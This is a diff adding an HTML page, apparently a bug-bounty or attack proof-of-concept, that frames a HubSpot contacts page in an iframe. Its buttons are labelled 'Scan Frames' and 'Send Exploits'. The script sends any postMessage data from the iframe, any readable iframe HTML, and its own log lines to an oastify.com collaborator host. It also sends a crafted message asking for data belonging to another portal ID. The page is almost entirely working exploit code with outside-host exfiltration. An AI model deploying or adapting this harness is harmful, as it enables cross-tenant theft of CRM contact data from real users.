@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head><title>Controller</title></head>
+<body style="margin:0">
+<div id="controls" style="position:fixed;top:0;left:0;right:0;background:#333;color:#0f0;padding:10px;font-family:monospace;font-size:12px;z-index:9999;">
+    <button onclick="scan()">Scan Frames</button>
+    <button onclick="exploit()">Send Exploits</button>
+    <span id="status">Ready</span>
+</div>
+
+<iframe id="hubspot" src="https://app-eu1.hubspot.com/contacts/146256700" style="width:100%;height:calc(100vh - 50px);border:none;margin-top:50px;"></iframe>
+
+<script>
+const EXFIL = '8enpds891mi66ld8hc42ougriio9c50u.oastify.com';
+const hubspot = document.getElementById('hubspot');
+const status = document.getElementById('status');
+
+function log(msg) {
+    status.textContent = msg;
+    new Image().src = 'https://' + EXFIL + '/?log=' + encodeURIComponent(msg);
+}
+
+// Listen for messages from iframe
+window.addEventListener('message', e => {
+    if (e.source === hubspot.contentWindow) {
+        log('Got message from HubSpot iframe');
+        
+        const data = JSON.stringify(e.data);
+        
+        fetch('https://' + EXFIL + '/hubspot_message', {
+            method: 'POST',
+            body: data
+        });
+    }
+});
+
+function scan() {
+    log('Scanning frames...');
+    
+    try {
+        // Try to access iframe
+        const doc = hubspot.contentWindow.document;
+        log('Same-origin! Full access!');
+        
+        // Extract everything
+        const html = doc.documentElement.outerHTML;
+        fetch('https://' + EXFIL + '/full_html', {
+            method: 'POST',
+            body: html
+        });
+        
+    } catch(e) {
+        log('Cross-origin: ' + e.message);
+        
+        // Can still send postMessages
+        hubspot.contentWindow.postMessage({
+            type: 'IDENTIFY'
+        }, '*');
+    }
+}
+
+function exploit() {
+    log('Sending exploits...');
+    
+    hubspot.contentWindow.postMessage({
+        type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
+        commandId: 'getData',
+        parameters: {portalId: '46962361'}
+    }, '*');
+}
+
+log('Controller loaded');
+</script>
+</body>
+</html>
